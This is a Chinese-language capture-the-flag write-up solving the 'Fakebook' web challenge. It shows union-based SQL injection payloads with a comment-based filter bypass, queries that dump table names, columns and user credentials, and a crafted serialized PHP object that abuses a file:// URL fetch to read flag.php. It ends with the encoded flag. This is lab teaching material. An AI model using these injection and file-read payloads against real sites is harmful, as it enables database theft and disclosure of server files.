# [网鼎杯 2018]Fakebook 1

- 进入网页，注册账号并登录，url栏出现GET传参，可能存在sql注入点

> <img src="../../IMG3/Screenshot 2024-06-11 190155.png">

- 经测试，存在数值型注入，字段数为4

`?no=1 order by 4#`

> <img src="../../IMG3/Screenshot 2024-06-11 190310.png">

- 在判断回显点时提示 `no hack ~_~`

`?no=0 union select 1,2,3,4#`

> <img src="../../IMG3/Screenshot 2024-06-11 190407.png">

- 经测试，题目将 `union select` 进行了过滤，过滤的方法是检查union后第二个字符是否为 `s` ，因此不能使用括号绕过，使用 `union/**/select` 绕过

`?no=0 union/**/select 1,2,3,4#`

> <img src="../../IMG3/Screenshot 2024-06-11 190740.png">

- 确认回显点为2，爆表

`?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#`

> <img src="../../IMG3/Screenshot 2024-06-11 191135.png">

- 爆字段

`?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name='users'#`

> <img src="../../IMG3/Screenshot 2024-06-11 191344.png">

- 爆内容

`?no=0 union/**/select 1,group_concat(no,'~',username,'~',passwd,'~',data),3,4 from users where no=1#`

> <img src="../../IMG3/Screenshot 2024-06-11 192335.png">

- 可以看到一串序列化字符串 `O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:0;s:4:"blog";s:5:"a.com";}` ，字符串的内容刚好是我们新建的账户a中的内容。题目到这里似乎陷入了僵局。扫目录，发现了 `flag.php`

> <img src="../../IMG3/Screenshot 2024-06-13 201941.png">

- `flag.php` ，和 `view.php` 在同一目录下，刚才sql注入时暴露了 `view.php` 的绝对路径，也就是说可能存在某个注入，让我们可以访问 `flag.php` 中的内容，查看网页源码，在blog一行发现了可疑之处

> <img src="../../IMG3/Screenshot 2024-06-11 202114.png">

- 这里我把blog设置为了 `http://www.baidu.com` ，对内容解码后得到的即是百度首页的源码，因此可知后台会对blog一行内容发送请求，并返回响应给前端，我们可以利用此处对 `flag.php` 发送请求。回想到在sql注入时，blog的内容刚好是序列化字符串，我们使用 `file://` 伪协议，构造攻击字符串

`O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}`

- 得到payload如下，网页获取到 `1` ，对 `1` 进行查询得到 `2,3,4` ， `2,3` 直接返回到前端，而 `4` 是在创建用户时生成的序列化字符串，后台在对 `4` 进行反序列化后返回到前端。这里我们便是用我们自己的查询语句覆盖后台的查询语句，来达到访问 `flag.php` 的目的

`?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"a";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#`

> <img src="../../IMG3/Screenshot 2024-06-11 202836.png">

- 可以看到blog一行已经修改成功，查看源代码，访问 `data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tiNjhmZWZiMS0wM2QzLTQ4YTItODBlNi02ODI3Mzg3YzY0NTF9IjsNCmV4aXQoMCk7DQo=` 得到flag

> <img src="../../IMG3/Screenshot 2024-06-11 203201.png">